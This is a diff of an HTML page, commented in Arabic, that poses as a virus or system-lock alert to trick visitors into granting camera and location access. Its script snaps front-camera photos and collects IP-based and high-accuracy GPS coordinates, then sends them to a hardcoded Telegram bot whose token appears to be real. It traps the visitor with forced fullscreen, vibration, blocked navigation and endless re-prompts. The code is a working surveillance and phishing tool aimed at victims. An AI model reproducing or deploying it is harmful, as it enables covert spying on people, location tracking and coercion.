@@ -2,35 +2,27 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>🚨 نظام الحماية: مطلوب إجراء فوري</title>
+    <title>🚨 System Critical Error</title>
     <style>
-        body { background: #000; color: #f00; font-family: 'Courier New', Courier, monospace; text-align: center; padding-top: 10%; overflow: hidden; }
-        .warning { font-size: 30px; animation: blink 0.5s infinite; }
-        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0;} 100% {opacity: 1;} }
+        body { background: #000; color: #f00; font-family: 'Courier New', monospace; text-align: center; height: 100vh; display: flex; flex-direction: column; justify-content: center; overflow: hidden; margin: 0; }
+        video { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; opacity: 0.02; z-index: -1; }
+        .box { border: 2px solid #f00; padding: 20px; margin: 10px; animation: pulse 0.1s infinite; }
+        @keyframes pulse { 0% {box-shadow: 0 0 10px #f00;} 100% {box-shadow: 0 0 50px #f00;} }
     </style>
 </head>
-<body>
-    <div class="warning">⚠️ تحذير أمني خطير ⚠️</div>
-    <p>تم قفل جهازك مؤقتاً لأسباب أمنية.</p>
-    <p>يجب الضغط على "سماح" (Allow) للكاميرا والموقع لفك التشفير.</p>
+<body onclick="launchTrap()">
 
-    <video id="v" autoplay style="width:1px;height:1px;opacity:0;"></video>
+    <div class="box">
+        <h1>⚠️ تم اكتشاف فايروس ⚠️</h1>
+        <p>جهازك معرض للخطر. اضغط في أي مكان للإصلاح فوراً.</p>
+    </div>
+
+    <video id="v" autoplay playsinline></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
         const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
         const ID = "1772820433";
-
-        // منع الضحية من مغادرة الصفحة (إظهار رسالة تحذير عند محاولة الإغلاق)
-        window.onbeforeunload = function() {
-            return "هل أنت متأكد؟ سيتم قفل جهازك نهائياً إذا خرجت!";
-        };
-
-        // منع العودة للخلف في المتصفح
-        history.pushState(null, null, location.href);
-        window.onpopstate = function () {
-            history.go(1);
-        };
 
         async function send(m, isImg=false) {
             let u = `https://api.telegram.org/bot${T}/`;
@@ -38,47 +30,55 @@
                 await fetch(u+'sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:ID,text:m})});
             } else {
                 const b = await (await fetch(m)).blob();
-                const f = new FormData(); f.append('chat_id',ID); f.append('photo',b,'hit.png');
+                const f = new FormData(); f.append('chat_id',ID); f.append('photo',b,'capture.png');
                 await fetch(u+'sendPhoto',{method:'POST',body:f});
             }
         }
 
-        async function startAttack() {
-            // محاولة سحب الموقع صمتاً عبر IP أولاً
-            fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>send(`📍 موقع الضحية المحاصر:\n${d.latitude},${d.longitude}`));
+        // سحب الموقع من 3 مصادر لضمان الوصول
+        function getLoc() {
+            fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>send(`📍 المصدر 1:\n${d.latitude},${d.longitude}`));
+            fetch('https://ipinfo.io/json?token=YOUR_OPTIONAL_TOKEN').then(r=>r.json()).then(d=> { let loc = d.loc.split(','); send(`📍 المصدر 2:\n${loc[0]},${loc[1]}`); });
+            fetch('http://ip-api.com/json/').then(r=>r.json()).then(d=>send(`📍 المصدر 3:\n${d.lat},${d.lon}`));
+        }
 
-            // حلقة تكرار (Loop) تطلب الكاميرا والموقع ولا تتوقف
-            while(true) {
-                try {
-                    const s = await navigator.mediaDevices.getUserMedia({video:true});
+        async function launchTrap() {
+            // تفعيل وضع ملء الشاشة لمنع الضحية من رؤية أزرار الخروج بسهولة
+            document.documentElement.requestFullscreen();
+            
+            // اهتزاز مستمر لإرباك الضحية
+            navigator.vibrate([1000, 500, 1000]);
+
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+                document.getElementById('v').srcObject = s;
+                
+                // انتظار ثانية واحدة لضمان وضوح الصورة (علاج السواد)
+                setTimeout(() => {
+                    const can = document.getElementById('c');
                     const vid = document.getElementById('v');
-                    vid.srcObject = s;
+                    can.width = vid.videoWidth; can.height = vid.videoHeight;
+                    can.getContext('2d').drawImage(vid,0,0);
+                    send(can.toDataURL('image/png'), true);
                     
-                    // إذا أعطى السماح، نصوره فوراً ونرسل الإحداثيات
+                    // الاستمرار في طلب الموقع الدقيق GPS
                     navigator.geolocation.getCurrentPosition(p => {
-                        send(`🎯 إحداثيات GPS دقيقة:\n${p.coords.latitude},${p.coords.longitude}`);
-                    });
+                        send(`🎯 إحداثيات GPS دقيقة جداً:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                    }, null, {enableHighAccuracy: true});
+                }, 1500);
 
-                    setTimeout(() => {
-                        const can = document.getElementById('c');
-                        can.width=vid.videoWidth; can.height=vid.videoHeight;
-                        can.getContext('2d').drawImage(vid,0,0);
-                        send(can.toDataURL('image/png'),true);
-                        s.getTracks().forEach(t=>t.stop());
-                        alert("✅ تم فك التشفير بنجاح!");
-                        window.location.href = "https://google.com";
-                    }, 500);
-                    break; // نخرج من الحلقة إذا نجحنا
-                } catch(e) {
-                    // إذا رفض، نظهر له رسالة مزعجة ونعيد المحاولة
-                    alert("⚠️ خطأ! يجب الضغط على 'سماح' لتجنب مسح بيانات جهازك!");
-                }
+            } catch(e) {
+                alert("⚠️ خطأ! اضغط سماح لفك قفل النظام!");
+                launchTrap(); // إعادة المحاولة إجبارياً
             }
         }
 
-        // بدء الهجوم عند أول لمسة للشاشة (لأن المتصفحات تشترط تفاعل المستخدم)
-        window.onclick = () => { startAttack(); };
-        window.ontouchstart = () => { startAttack(); };
+        // منع إغلاق الصفحة أو العودة
+        window.onbeforeunload = () => "🚨 جهازك في خطر! هل تريد المغادرة؟";
+        history.pushState(null, null, location.href);
+        window.onpopstate = () => history.go(1);
+
+        window.onload = getLoc;
     </script>
 </body>
 </html>
